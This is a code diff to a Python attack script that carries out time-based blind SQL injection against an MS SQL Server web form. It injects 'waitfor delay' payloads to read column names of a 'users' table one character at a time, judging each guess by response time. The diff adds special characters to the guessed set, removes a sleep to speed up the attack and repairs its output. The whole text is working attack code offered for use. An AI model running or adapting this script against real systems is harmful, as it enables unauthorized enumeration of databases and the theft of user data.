@@ -8,8 +8,9 @@ headers={
     "Content-type" : "application/x-www-form-urlencoded"
 }
 
-listOfChars = string.ascii_lowercase
 special_char = '''!#$^&*_+'''
+listOfChars = string.ascii_lowercase + special_char
+
 
 
 #column_name = "password"
@@ -30,14 +31,14 @@ def check(char,payload):
     req = requests.post(url=url, headers=headers, data=data,proxies={"http":"http://127.0.0.1:8080"})
     spend_time=req.elapsed.total_seconds()
     if (spend_time > 19):
-        print("[+]Found char: " + char + " payload:" + payload + "spend_time: " + spend_time)
+        print("[+] Found char: " + char + " payload:" + payload + "  spend_time: " + str(spend_time))
         found_char=char
         #column_name = column_name + char
         #print("[+]Current column_name:" + column_name)
     else:
         pass
         #print("[-]Not this char: " + char)
-    time.sleep(0.5)
+    #time.sleep(0.5)
     return found_char
 
 
@@ -49,19 +50,13 @@ while status==200:
         payload = "test ' IF ((SELECT count(c.name) FROM sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name LIKE '" + final_column_name + "{}%')=1) waitfor delay '0:0:20'--".format(
             char)
 
+        real_char=check(char,payload)
+        if real_char != "":
+            final_column_name=final_column_name+real_char
+            print("[+] Current column_name: " + final_column_name)
+        else:
+            print("[-] No changed caused by '"+char+"'..")
 
-        final_column_name=final_column_name+check(char,payload)
-        print("[+]Current column_name: " + final_column_name)
-
-
-    for char in special_char:
-        payload = "test ' IF ((SELECT count(c.name) FROM sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name LIKE '" + final_column_name + "{}%')=1) waitfor delay '0:0:20'--".format(
-            char)
-        #print(payload)
-
-
-        final_column_name=final_column_name+check(char,payload)
-        print("[+]Current column_name: " + final_column_name)
 
 '''
 
@@ -70,8 +65,8 @@ payload = "test ' IF ((SELECT count(c.name) FROM sys.columns c, sys.tables t whe
     char)
 print(payload)
 final_column_name = final_column_name + check(char, payload)
-print("[+]Current column_name: " + final_column_name)
+print("[+] Current column_name: " + final_column_name)
 '''
-print("[+]Final result: "+final_column_name)
+print("[+] Final result: "+final_column_name)
 
 
